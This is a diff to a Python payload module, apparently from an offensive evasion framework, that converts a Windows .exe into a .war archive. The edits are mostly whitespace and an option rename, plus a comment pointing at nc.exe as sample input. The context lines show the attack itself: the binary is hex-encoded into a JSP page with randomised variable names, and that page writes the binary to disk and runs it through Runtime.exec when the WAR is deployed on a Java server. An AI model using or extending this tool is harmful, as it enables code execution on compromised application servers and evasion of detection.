@@ -19,15 +19,17 @@ import os
 import sys
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "Auxiliary script which converts a .exe file to .war"
         self.language = "python"
         self.rating = "Normal"
         self.extension = "war"
-        
-        self.required_options = {   "original_exe"  :  ["", "Path to .exe file to convert to .war"],}
+
+        self.required_options = {
+                                    "ORIGINAL_EXE" : ["", "Path to a .exe file to convert to .war file"]  #/usr/share/windows-binaries/nc.exe
+                                }
 
 
     def generate(self):
@@ -51,20 +53,20 @@ class Payload:
         var_name = helpers.randomString()
         var_payload = helpers.randomString()
         random_war_name = helpers.randomString()
-        
+
         # Variables for path to our executable input and war output
-        original_exe = self.required_options["original_exe"][0]
+        ORIGINAL_EXE = self.required_options["ORIGINAL_EXE"][0]
         war_file = settings.PAYLOAD_COMPILED_PATH + random_war_name + ".war"
-        
+
         try:
             # read in the executable
-            raw = open(original_exe, 'rb').read()
+            raw = open(ORIGINAL_EXE, 'rb').read()
             txt_exe = hexlify(raw)
             txt_payload_file = open(var_hexfile + ".txt", 'w')
             txt_payload_file.write(txt_exe)
             txt_payload_file.close()
         except IOError:
-            print helpers.color("\n [!] original_exe file \"" + original_exe + "\" not found\n", warning=True)
+            print helpers.color("\n [!] ORIGINAL_EXE file \"" + ORIGINAL_EXE + "\" not found\n", warning=True)
             return ""
 
         # Set up our JSP files used for triggering the payload within the war file
@@ -96,12 +98,12 @@ class Payload:
         jsp_payload += var_outputstream + ".close();\n"
         jsp_payload += "Process " + var_proc + " = Runtime.getRuntime().exec(" + var_exepath + ");\n"
         jsp_payload += "%>\n"
-        
+
         # Write out the jsp code to file
         jsp_file_out = open(var_payload + ".jsp", 'w')
         jsp_file_out.write(jsp_payload)
         jsp_file_out.close()
-        
+
         # MANIFEST.MF file contents, and write it out to disk
         manifest_file = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
         man_file = open("MANIFEST.MF", 'w')
